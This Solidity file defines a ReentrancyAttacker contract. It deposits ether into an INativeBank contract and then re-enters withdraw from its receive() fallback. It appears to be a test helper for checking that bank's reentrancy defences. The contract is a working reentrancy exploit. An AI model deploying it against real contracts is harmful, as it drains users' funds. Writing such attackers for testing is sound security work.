// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import { INativeBank } from "../INativeBank.sol";

contract ReentrancyAttacker {
    INativeBank public bank;

    constructor(address _target) {
        bank = INativeBank(_target);
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw(msg.value/2);
    }

    receive() external payable {
        bank.withdraw(1000000);
    }
}